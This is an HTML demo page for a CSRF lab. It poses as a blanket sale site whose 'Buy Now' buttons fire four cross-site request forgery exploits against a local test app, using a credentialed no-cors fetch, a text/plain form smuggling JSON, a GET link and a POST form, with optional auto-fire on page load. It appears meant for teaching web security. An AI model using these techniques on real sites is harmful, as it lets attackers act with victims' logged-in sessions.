<!--
    README

    This document contains multiple exploits, each of which is enough on its own.
    We just added multiple to demonstrate different approaches.

    All exploits are marked with "Exploit X: Start" and "Exploit X: End" for you to find them easily within the document.
    Everything else in this document is just to make the demo nicer. :)

    For the exploits to work, "alice" needs to be logged in through the normal log-in form
    http://localhost:8000/accounts/login/ and assigned the "In front of the fireplace" place.
-->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Don't use this on production. Check https://tailwindcss.com for proper setup instructions.-->
    <script src="./assets/tailwindcss.js?plugins=typography"></script>

    <title>Sale | All the Fluff</title>
</head>
<body class="my-8">
    <!-- This iframe is used as a target for the different exploits to prevent redirecting the user. -->
    <iframe class="hidden" name="exploit-frame"></iframe>

    <header class="container mx-auto">
        <h1 class="text-4xl font-bold mb-6 basis-1/2">
            all-the-fluff.com
            <div class="text-lg font-medium text-slate-500">It's so fluffy I'm gonna die!</div>
        </h1>
    </header>

    <!-- Ads -->
    <main class="container mx-auto">
        <div class="flex flex-wrap">
            <article class="mr-4 mb-4">
                <div class="relative w-80 h-80 border border-dashed border-[3px] border-slate-500 rounded-md">
                    <img class="absolute z-10 inset-0 w-full h-full object-cover" loading="lazy" src="./assets/blanket-1.jpg" />
                    <div class="relative flex flex-col justify-between p-3 z-20 bg-black/[0.6] h-full w-full">
                        <div>
                            <div class="text-red-500 text-lg font-medium">20% Off</div>
                            <h1 class="text-4xl font-bold text-white text-center mx-2 mt-6 leading-tight">
                                Extra Fluffy Blanky
                            </h1>
                        </div>

                        <div>
                            <div class="mb-6 text-center">
                                <!-- Exploit 1: Start -->
                                <!-- No-cors fetch exploit -->
                                <!-- In this mode, fetch is restricted to the capabilities of what forms can do. See here for more information: https://evertpot.com/no-cors/ -->
                                <script>
                                    async function exploit1() {
                                        await fetch("http://localhost:8000/insecure-rest-leave-sleeping-place/1/", {
                                            mode:"no-cors",
                                            method: "POST",
                                            credentials: "include",
                                            body: '{"claimed_by": null }'
                                        })
                                    }
                                    // NOTE: Uncomment the following line for onload exploit.
                                    // exploit1();
                                </script>
                                <!-- Exploit 1: End -->
                                <button
                                    class="px-5 py-3 uppercase font-medium text-white no-underline rounded-md bg-green-600 hover:bg-green-800 active:bg-green-900 focus:outline-none focus:ring focus:ring-green-300"
                                    onclick="exploit1()"
                                >
                                    Buy Now
                                </a>
                            </div>
                            <div
                                class="clock text-center text-red-500 font-bold text-3xl"
                                data-time-hours="13"
                                data-time-minutes="37"
                                data-time-seconds="42"
                            >
                                13:37:42
                            </div>
                        </div>
                    </div>
                    <div class="absolute bottom-0 right-0 m-2 px-5 py-1 border border-solid border-white border-[2px] text-white z-20">
                        Ad
                    </div>
                </div>
            </article>
            <article class="mr-4 mb-4">
                <div class="relative w-80 h-80 border border-dashed border-[3px] border-slate-500 rounded-md">
                    <img class="absolute z-10 inset-0 w-full h-full object-cover" loading="lazy" src="./assets/blanket-2.jpg" />
                    <div class="relative flex flex-col justify-between p-3 z-20 bg-black/[0.6] h-full w-full">
                        <div>
                            <div class="text-red-500 text-lg font-medium">13% Off</div>
                            <h1 class="text-4xl font-bold text-white text-center mx-2 mt-6 leading-tight">
                                Extra Cozy Blanky
                            </h1>
                        </div>

                        <div>
                            <div class="mb-6 text-center">
                                <!-- Exploit 2: Start -->
                                <form
                                    id="exploit-2"
                                    enctype="text/plain"
                                    action="http://localhost:8000/insecure-rest-leave-sleeping-place/1/"
                                    method="POST"
                                    target="exploit-frame"
                                >
                                    <!-- Name and value are separated by an equal sign. This only works if the backend accepts text/plain and doesn't enforce it to be application/json. DRF does not support text/plain. -->
                                    <input type="hidden" name='{"claimed_by": null, "' value='":""}'>
                                    <button
                                        class="px-5 py-3 uppercase font-medium text-white no-underline rounded-md bg-green-600 hover:bg-green-800 active:bg-green-900 focus:outline-none focus:ring focus:ring-green-300"
                                        type="submit"
                                    >Buy Now</button>
                                </form>
                                <!-- NOTE: Uncomment the following line to execute the exploit on load. -->
                                <!-- <script>document.getElementById("exploit-2").submit()</script> -->
                                <!-- Exploit 2: End -->
                            </div>
                            <div
                                class="clock text-center text-red-500 font-bold text-3xl"
                                data-time-hours="11"
                                data-time-minutes="11"
                                data-time-seconds="11"
                            >
                                11:11:11
                            </div>
                        </div>
                    </div>
                    <div class="absolute bottom-0 right-0 m-2 px-5 py-1 border border-solid border-white border-[2px] text-white z-20">
                        Ad
                    </div>
                </div>
            </article>
            <article class="mr-4 mb-4">
                <div class="relative w-80 h-80 border border-dashed border-[3px] border-slate-500 rounded-md">
                    <img class="absolute z-10 inset-0 w-full h-full object-cover" loading="lazy" src="./assets/blanket-3.jpg" />
                    <div class="relative flex flex-col justify-between p-3 z-20 bg-black/[0.6] h-full w-full">
                        <div>
                            <div class="text-red-500 text-lg font-medium">17% Off</div>
                            <h1 class="text-4xl font-bold text-white text-center mx-2 mt-6 leading-tight">
                                Extra Relaxing Blanky
                            </h1>
                        </div>

                        <div>
                            <div class="mb-6 text-center">
                                <!-- Exploit 3: Start -->
                                <a
                                    class="inline-block px-5 py-3 uppercase font-medium text-white no-underline rounded-md bg-green-600 hover:bg-green-800 active:bg-green-900 focus:outline-none focus:ring focus:ring-green-300"
                                    href="http://localhost:8000/insecure-leave-sleeping-place/1/"
                                    id="exploit-3"
                                    target="exploit-frame"
                                >Buy Now</a>
                                <!-- NOTE: Uncomment the following line to execute the exploit on load. -->
                                <!-- <script>document.getElementById("exploit-3").click()</script> -->
                                <!-- Exploit 2: End -->
                            </div>
                            <div
                                class="clock text-center text-red-500 font-bold text-3xl"
                                data-time-hours="24"
                                data-time-minutes="00"
                                data-time-seconds="00"
                            >
                                24:00:00
                            </div>
                        </div>
                    </div>
                    <div class="absolute bottom-0 right-0 m-2 px-5 py-1 border border-solid border-white border-[2px] text-white z-20">
                        Ad
                    </div>
                </div>
            </article>
            <article>
                <div class="relative w-80 h-80 border border-dashed border-[3px] border-slate-500 rounded-md">
                    <img class="absolute z-10 inset-0 w-full h-full object-cover" loading="lazy" src="./assets/blanket-4.jpg" />
                    <div class="relative flex flex-col justify-between p-3 z-20 bg-black/[0.6] h-full w-full">
                        <div>
                            <div class="text-red-500 text-lg font-medium">23% Off</div>
                            <h1 class="text-4xl font-bold text-white text-center mx-2 mt-6 leading-tight">
                                Extra Snugly Blanky
                            </h1>
                        </div>

                        <div>
                            <div class="mb-6 text-center">
                                <!-- Exploit 4: Start -->
                                <form
                                    method='POST'
                                    action='http://localhost:8000/insecure-post-leave-sleeping-place/'
                                    target="exploit-frame"
                                    id="exploit-4"
                                >
                                    <input type='hidden' name='place_id' value='1'>
                                    <button
                                        class="px-5 py-3 uppercase font-medium text-white no-underline rounded-md bg-green-600 hover:bg-green-800 active:bg-green-900 focus:outline-none focus:ring focus:ring-green-300"
                                        type="submit"
                                    >Buy Now</button>
                                </form>
                                <!-- NOTE: Uncomment the following line to execute the exploit on load. -->
                                <!-- <script>document.getElementById("exploit-4").submit()</script> -->
                                <!-- Exploit 4: End -->
                            </div>
                            <div
                                class="clock text-center text-red-500 font-bold text-3xl"
                                data-time-hours="17"
                                data-time-minutes="00"
                                data-time-seconds="00"
                            >
                                17:00:00
                            </div>
                        </div>
                    </div>
                    <div class="absolute bottom-0 right-0 m-2 px-5 py-1 border border-solid border-white border-[2px] text-white z-20">
                        Ad
                    </div>
                </div>
            </article>
        </div>
    </main>

    <!-- Timer update -->
    <!-- This is not part of the exploit, just to make the demo nicer. -->
    <script>
        function twoDigitPadding(num) {
           return num.toString().padStart(2, '0');
        }

        window.onload = () => {
            document.querySelectorAll('.clock').forEach((clock) => {
                const timerMilliseconds = (1000 * (
                    (parseInt(clock.dataset.timeHours) * 60 * 60) +
                    (parseInt(clock.dataset.timeMinutes) * 60) +
                    parseInt(clock.dataset.timeSeconds)
                ));
                const targetMilliseconds = new Date().getTime() + timerMilliseconds;

                const interval = setInterval(function() {
                    const now = new Date().getTime();
                    const diff = targetMilliseconds - now;

                    let seconds = Math.floor(diff / 1000);
                    let minutes = Math.floor(seconds / 60);
                    let hours = Math.floor(minutes / 60);

                    const time = `${twoDigitPadding(hours % 24)}:${twoDigitPadding(minutes % 60)}:${twoDigitPadding(seconds % 60)}`;
                    clock.textContent = time;

                    if (diff < 0) {
                        clearInterval(interval);
                    }
                }, 100);
            });
        };
    </script>
</body>
</html>
